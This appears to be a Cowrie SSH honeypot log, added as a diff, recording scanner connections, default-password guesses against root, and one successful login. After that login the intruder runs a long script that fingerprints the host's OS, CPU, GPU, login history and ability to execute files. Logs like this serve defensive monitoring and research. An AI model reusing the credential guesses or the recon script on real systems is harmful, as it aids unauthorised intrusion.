@@ -1,0 +1,594 @@
+2026-07-09T00:10:04.959937Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 91.92.40.5:46192 (10.0.2.192:2222) [session: 632b481b4115]
+2026-07-09T00:10:05.058576Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T00:10:05.058755Z [HoneyPotSSHTransport,38,91.92.40.5] Connection lost after 0.1 seconds
+2026-07-09T00:11:06.358876Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 91.92.40.5:48096 (10.0.2.192:2222) [session: 26734cc84888]
+2026-07-09T00:11:06.833126Z [HoneyPotSSHTransport,39,91.92.40.5] Remote SSH version: SSH-2.0-Go
+2026-07-09T00:11:06.833687Z [HoneyPotSSHTransport,39,91.92.40.5] SSH client hassh fingerprint: 2ec37a7cc8daf20b10e1ad6221061ca5
+2026-07-09T00:11:06.834378Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ssh-rsa'
+2026-07-09T00:11:06.834442Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T00:11:06.834506Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T00:11:08.163248Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2026-07-09T00:11:08.163537Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2026-07-09T00:11:08.962092Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'
+2026-07-09T00:11:09.458208Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2026-07-09T00:11:09.458626Z [HoneyPotSSHTransport,39,91.92.40.5] login attempt [b'root'/b'root'] failed
+2026-07-09T00:11:10.460413Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' failed auth b'password'
+2026-07-09T00:11:10.460625Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2026-07-09T00:11:11.300490Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T00:11:11.300658Z [HoneyPotSSHTransport,39,91.92.40.5] Connection lost after 4.9 seconds
+2026-07-09T00:12:39.448406Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 91.92.40.5:46084 (10.0.2.192:2222) [session: daaa6a558df9]
+2026-07-09T00:12:40.164515Z [HoneyPotSSHTransport,40,91.92.40.5] Remote SSH version: SSH-2.0-Go
+2026-07-09T00:12:40.165102Z [HoneyPotSSHTransport,40,91.92.40.5] SSH client hassh fingerprint: 2ec37a7cc8daf20b10e1ad6221061ca5
+2026-07-09T00:12:40.165828Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ssh-rsa'
+2026-07-09T00:12:40.165892Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T00:12:40.165943Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T00:12:41.297675Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2026-07-09T00:12:41.324957Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2026-07-09T00:12:41.813561Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'
+2026-07-09T00:12:42.661279Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2026-07-09T00:12:42.661693Z [HoneyPotSSHTransport,40,91.92.40.5] login attempt [b'root'/b'admin'] failed
+2026-07-09T00:12:43.663335Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' failed auth b'password'
+2026-07-09T00:12:43.663535Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2026-07-09T00:12:44.009325Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T00:12:44.009497Z [HoneyPotSSHTransport,40,91.92.40.5] Connection lost after 4.6 seconds
+2026-07-09T00:14:00.810500Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 91.92.40.5:51598 (10.0.2.192:2222) [session: 6e538ab99bde]
+2026-07-09T00:14:01.039334Z [HoneyPotSSHTransport,41,91.92.40.5] Remote SSH version: SSH-2.0-Go
+2026-07-09T00:14:01.039901Z [HoneyPotSSHTransport,41,91.92.40.5] SSH client hassh fingerprint: 2ec37a7cc8daf20b10e1ad6221061ca5
+2026-07-09T00:14:01.040825Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ssh-rsa'
+2026-07-09T00:14:01.040902Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T00:14:01.040955Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T00:14:01.930534Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2026-07-09T00:14:01.931555Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2026-07-09T00:14:02.551761Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'
+2026-07-09T00:14:03.021720Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2026-07-09T00:14:03.022118Z [HoneyPotSSHTransport,41,91.92.40.5] login attempt [b'root'/b'password'] failed
+2026-07-09T00:14:04.023721Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' failed auth b'password'
+2026-07-09T00:14:04.023921Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2026-07-09T00:14:04.493480Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T00:14:04.493660Z [HoneyPotSSHTransport,41,91.92.40.5] Connection lost after 3.7 seconds
+2026-07-09T00:15:23.884684Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 91.92.40.5:45208 (10.0.2.192:2222) [session: 5bd2a92d4c5f]
+2026-07-09T00:15:24.197235Z [HoneyPotSSHTransport,42,91.92.40.5] Remote SSH version: SSH-2.0-Go
+2026-07-09T00:15:24.232508Z [HoneyPotSSHTransport,42,91.92.40.5] SSH client hassh fingerprint: 2ec37a7cc8daf20b10e1ad6221061ca5
+2026-07-09T00:15:24.233366Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ssh-rsa'
+2026-07-09T00:15:24.233435Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T00:15:24.233486Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T00:15:25.271213Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2026-07-09T00:15:25.271520Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2026-07-09T00:15:26.012430Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'
+2026-07-09T00:15:26.421170Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2026-07-09T00:15:26.421589Z [HoneyPotSSHTransport,42,91.92.40.5] login attempt [b'root'/b'123456'] succeeded
+2026-07-09T00:15:26.422018Z [HoneyPotSSHTransport,42,91.92.40.5] Initialized emulated server as architecture: linux-x64-lsb
+2026-07-09T00:15:26.422232Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'
+2026-07-09T00:15:26.422378Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'
+2026-07-09T00:15:26.934622Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request
+2026-07-09T00:15:26.935020Z [cowrie.ssh.session.HoneyPotSSHSession#info] channel open
+2026-07-09T00:15:27.514019Z [twisted.conch.ssh.session#info] Executing command "b'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d\' \' -f1 ) || ( [ -f /etc/os-release ] && grep \'^ID=\' /etc/os-release | cut -d= -f2 | tr -d \'"\' ) || echo "")\narch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q "lm" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 8" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 7" /proc/cpuinfo && echo armv7l ) || echo "")\nuptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null)\ncpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null)\ncpu_model=$( { lscpu 2>/dev/null | awk -F: \'/Model name/ {print $2}\'; grep -m1 -E "^model name" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E "^Hardware" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed \'/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//\' | head -1 )\ngpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null )\nlast_output=$(last 2>/dev/null)\nfilter_output=$( ( export LANG=C LC_ALL=C; echo \'===SHELL_BEHAVIOR===\'; printf \'path_err=\'; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d \'\\n\' 2>/dev/null || busybox tr -d \'\\n\' 2>/dev/null || cat ); printf \'\\n\'; printf \'cmd_err=\'; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d \'\\n\' 2>/dev/null || busybox tr -d \'\\n\' 2>/dev/null || cat ); printf \'\\n\'; printf \'execute_err=\'; out=$(bash -c \'printf "#!/bin/bash\\necho \\"xxxxxx\\"\\n" > filter && chmod +x filter && ./filter && rm -rf filter\' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/bin/bash -c \'printf "#!/bin/bash\\necho \\"xxxxxx\\"\\n" > filter && chmod +x filter && ./filter && rm -rf filter\' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c \'printf "#!/bin/bash\\necho \\"xxxxxx\\"\\n" > filter && chmod +x filter && ./filter && rm -rf filter\' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(busybox sh -c \'printf "#!/bin/sh\\necho \\"xxxxxx\\"\\n" > filter && chmod +x filter && ./filter && rm -rf filter\' 2>&1 || sh -c \'printf "#!/bin/sh\\necho \\"xxxxxx\\"\\n" > filter && chmod +x filter && ./filter && rm -rf filter\' 2>&1); esac; esac; esac; printf \'%s\' "$out" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d \'\\n\' 2>/dev/null || busybox tr -d \'\\n\' 2>/dev/null || cat ); printf \'\\n\'; echo \'===DONE===\' ) 2>&1 )\necho "UNAME:$uname"\necho "ARCH:$arch"\necho "UPTIME:$uptime"\necho "CPUS:$cpus"\necho "CPU_MODEL:$cpu_model"\necho "GPU:$gpu_info"\necho "LAST:$last_output"\necho "FILTER:$filter_output"'"
+2026-07-09T00:15:27.514995Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] CMD: export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q "lm" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 8" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q "CPU architecture: 7" /proc/cpuinfo && echo armv7l ) || echo ""); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E "^model name" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E "^Hardware" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; printf 'execute_err='; out=$(bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case "$out" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf "#!/bin/sh\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' "$out" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\n' 2>/dev/null || busybox tr -d '\n' 2>/dev/null || cat ); printf '\n'; echo '===DONE===' ) 2>&1 ); echo "UNAME:$uname"; echo "ARCH:$arch"; echo "UPTIME:$uptime"; echo "CPUS:$cpus"; echo "CPU_MODEL:$cpu_model"; echo "GPU:$gpu_info"; echo "LAST:$last_output"; echo "FILTER:$filter_output"
+2026-07-09T00:15:27.515763Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] CMD: uname -s -v -n -m 2 > /dev/null
+2026-07-09T00:15:27.516223Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] Command found: uname -s -v -n -m
+2026-07-09T00:15:27.516479Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] CMD: /bin/uname -s -v -n -m 2 > /dev/null
+2026-07-09T00:15:27.516855Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] Command found: /bin/uname -s -v -n -m
+2026-07-09T00:15:27.517028Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] CMD: /usr/bin/uname -s -v -n -m 2 > /dev/null
+2026-07-09T00:15:27.517751Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] Command found: /usr/bin/uname -s -v -n -m
+2026-07-09T00:15:27.518701Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] CMD: busybox uname -s -v -n -m 2 > /dev/null
+2026-07-09T00:15:27.519182Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] Command found: busybox uname -s -v -n -m
+2026-07-09T00:15:27.519280Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] Command found: uname -s -v -n -m
+2026-07-09T00:15:27.519881Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] CMD: ( [ -f /proc/version ]
+2026-07-09T00:15:27.520246Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] CMD: [ -f /proc/version ]
+2026-07-09T00:15:27.520819Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] Command found: [ -f /proc/version ]
+2026-07-09T00:15:27.521197Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] CMD: head -1 /proc/version | cut -d -f1
+2026-07-09T00:15:27.521559Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] Command found: cut -d -f1
+2026-07-09T00:15:27.521617Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] Command found: head -1 /proc/version
+2026-07-09T00:15:27.522106Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] CMD: [ -f /etc/os-release ]
+2026-07-09T00:15:27.522699Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] Command found: [ -f /etc/os-release ]
+2026-07-09T00:15:27.523119Z [SSHChannel session (0) on SSHService b'ssh-connection' on HoneyPotSSHTransport,42,91.92.40.5] exception: No closing quotation
+2026-07-09T00:15:28.178523Z [twisted.conch.ssh.session#info] exitCode: 0
+2026-07-09T00:15:28.178712Z [cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'
+2026-07-09T00:15:28.179238Z [HoneyPotSSHTransport,42,91.92.40.5] Closing TTY Log: var/lib/cowrie/tty/9dc0f0fe6a402818d0335f679d265004acff9194dd2b7e846fa757fbc4b48ddc after 0.7 seconds
+2026-07-09T00:15:28.179706Z [cowrie.ssh.connection.CowrieSSHConnection#info] sending close 0
+2026-07-09T00:15:28.630785Z [cowrie.ssh.session.HoneyPotSSHSession#info] remote close
+2026-07-09T00:15:28.634648Z [HoneyPotSSHTransport,42,91.92.40.5] avatar root logging out
+2026-07-09T00:15:28.634822Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T00:15:28.635034Z [HoneyPotSSHTransport,42,91.92.40.5] Connection lost after 4.7 seconds
+2026-07-09T00:16:49.564919Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 91.92.40.5:57064 (10.0.2.192:2222) [session: 548b11877117]
+2026-07-09T00:16:49.580771Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T00:16:49.580939Z [HoneyPotSSHTransport,43,91.92.40.5] Connection lost after 0.0 seconds
+2026-07-09T00:16:49.671273Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 91.92.40.5:57076 (10.0.2.192:2222) [session: be750fe6634a]
+2026-07-09T00:16:49.681890Z [HoneyPotSSHTransport,44,91.92.40.5] Remote SSH version: SSH-2.0-Go
+2026-07-09T00:16:49.780077Z [HoneyPotSSHTransport,44,91.92.40.5] SSH client hassh fingerprint: 2ec37a7cc8daf20b10e1ad6221061ca5
+2026-07-09T00:16:49.780889Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ssh-rsa'
+2026-07-09T00:16:49.780957Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T00:16:49.781008Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T00:16:50.217249Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2026-07-09T00:16:50.227600Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2026-07-09T00:16:50.399175Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'
+2026-07-09T00:16:50.490487Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2026-07-09T00:16:50.490920Z [HoneyPotSSHTransport,44,91.92.40.5] login attempt [b'root'/b'toor'] failed
+2026-07-09T00:16:51.492572Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' failed auth b'password'
+2026-07-09T00:16:51.492788Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2026-07-09T00:16:51.633864Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T00:16:51.634053Z [HoneyPotSSHTransport,44,91.92.40.5] Connection lost after 2.0 seconds
+2026-07-09T00:51:12.723564Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 20.171.9.56:38078 (10.0.2.192:2222) [session: 50f88f971a53]
+2026-07-09T00:51:22.781091Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T00:51:22.781291Z [HoneyPotSSHTransport,45,20.171.9.56] Connection lost after 10.1 seconds
+2026-07-09T00:51:22.831851Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 20.171.9.56:47696 (10.0.2.192:2222) [session: d83c5b196fbf]
+2026-07-09T00:51:22.832413Z [HoneyPotSSHTransport,46,20.171.9.56] Remote SSH version: MGLNDD_44.205.17.200_22
+2026-07-09T00:51:22.832725Z [HoneyPotSSHTransport,46,20.171.9.56] Bad protocol version identification: b'MGLNDD_44.205.17.200_22'
+2026-07-09T00:51:22.832913Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T00:51:22.832992Z [HoneyPotSSHTransport,46,20.171.9.56] Connection lost after 0.0 seconds
+2026-07-09T02:07:44.700335Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 205.210.31.222:52487 (10.0.2.192:2222) [session: 650003a12f02]
+2026-07-09T02:07:44.861238Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T02:07:44.861416Z [HoneyPotSSHTransport,47,205.210.31.222] Connection lost after 0.2 seconds
+2026-07-09T02:51:15.263023Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 87.236.176.81:40523 (10.0.2.192:2222) [session: 9e771b0b6102]
+2026-07-09T02:51:17.264276Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T02:51:17.264465Z [HoneyPotSSHTransport,48,87.236.176.81] Connection lost after 2.0 seconds
+2026-07-09T02:51:17.337460Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 87.236.176.81:54539 (10.0.2.192:2222) [session: e022e501ee4c]
+2026-07-09T02:51:17.338035Z [HoneyPotSSHTransport,49,87.236.176.81] Remote SSH version: SSH-2.0-Go
+2026-07-09T02:51:17.412471Z [HoneyPotSSHTransport,49,87.236.176.81] SSH client hassh fingerprint: 16443846184eafde36765c9bab2f4397
+2026-07-09T02:51:17.413346Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2026-07-09T02:51:17.413438Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T02:51:17.413492Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T02:51:17.488453Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T02:51:17.488628Z [HoneyPotSSHTransport,49,87.236.176.81] Connection lost after 0.2 seconds
+2026-07-09T06:29:17.530965Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 91.230.168.127:59081 (10.0.2.192:2222) [session: 794d695b4e35]
+2026-07-09T06:29:17.535199Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T06:29:17.535313Z [HoneyPotSSHTransport,50,91.230.168.127] Connection lost after 0.0 seconds
+2026-07-09T06:29:17.615433Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 91.230.168.125:42845 (10.0.2.192:2222) [session: 2173422d71a4]
+2026-07-09T06:29:27.764968Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T06:29:27.765141Z [HoneyPotSSHTransport,51,91.230.168.125] Connection lost after 10.1 seconds
+2026-07-09T06:29:41.688079Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 91.230.168.253:56645 (10.0.2.192:2222) [session: 89994b10997d]
+2026-07-09T06:29:41.690670Z [HoneyPotSSHTransport,52,91.230.168.253] Remote SSH version: b ^ ,;}\x9d=\xd4C\x93!\xf3\xaa\xea\xa3\xf8\xed\xdat\xd6BN\x9f\xe3\xf9"\xf2\xee\xd2 b\x82\xca=\xea\x91\xb38\x91\xea;\xcdG$\xf9	\x8e\xa0\xf0<:\xf9\xab;\xff \x8a  3 g\xc0\x9e\xc0\xa2 \x9e 9 k\xc0\x9f\xc0\xa3 \x9f E \xbe \x88 \xc4 \x9a\xc0\xc0	\xc0#\xc0\xac\xc0\xae\xc0+\xc0
+2026-07-09T06:29:41.691200Z [HoneyPotSSHTransport,52,91.230.168.253] Bad protocol version identification: b'\x16\x03\x03\x02b\x01\x00\x02^\x03\x03\x00,;}\x9d=\xd4\x0cC\x93!\xf3\xaa\xea\xa3\xf8\x1a\xed\x02\x07\xdat\xd6BN\x9f\xe3\xf9"\xf2\xee\xd2 b\x1f\x82\xca=\xea\x91\x1b\xb38\x91\xea;\xcdG\x0f$\xf9\t\x8e\r\x01\xa0\xf0<:\xf9\xab\x0e\x03;\xff\x00\x8a\x00\x16\x003\x00g\xc0\x9e\xc0\xa2\x00\x9e\x009\x00k\xc0\x9f\xc0\xa3\x00\x9f\x00E\x00\xbe\x00\x88\x00\xc4\x00\x9a\xc0\x08\xc0\t\xc0#\xc0\xac\xc0\xae\xc0+\xc0'
+2026-07-09T06:29:41.691399Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T06:29:41.691462Z [HoneyPotSSHTransport,52,91.230.168.253] Connection lost after 0.0 seconds
+2026-07-09T06:29:41.849375Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 91.230.168.120:54589 (10.0.2.192:2222) [session: df6ece4b8e58]
+2026-07-09T06:29:44.856331Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T06:29:44.856506Z [HoneyPotSSHTransport,53,91.230.168.120] Connection lost after 3.0 seconds
+2026-07-09T07:54:25.319945Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 71.6.199.87:34370 (10.0.2.192:2222) [session: bd4eb3074c3b]
+2026-07-09T07:54:25.320502Z [HoneyPotSSHTransport,54,71.6.199.87] Remote SSH version: SSH-2.0-Go
+2026-07-09T07:54:25.418422Z [HoneyPotSSHTransport,54,71.6.199.87] SSH client hassh fingerprint: 084386fa7ae5039bcf6f07298a05a227
+2026-07-09T07:54:25.419470Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ecdsa-sha2-nistp256'
+2026-07-09T07:54:25.419541Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
